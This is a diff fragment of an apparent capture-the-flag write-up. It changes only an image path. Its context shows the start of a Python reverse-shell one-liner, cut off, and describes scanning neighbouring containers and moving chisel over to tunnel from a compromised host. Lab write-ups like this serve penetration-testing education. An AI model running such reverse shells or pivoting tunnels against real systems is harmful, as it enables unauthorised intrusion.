@@ -84,7 +84,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 Now, we need to think about how to use this container to find out more about the machine. Firstly, I took a look around at the IP addresses and found out that I should be scanning the other containers present on this network using some tunneling. What gave it away for me was the IP address ending in 3, meaning there are probably other hosts on this.
 
-<figure><img src="../../../.gitbook/assets/image (113) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (113) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 As such, I transferred chisel over to this machine and created a tunnel.
 
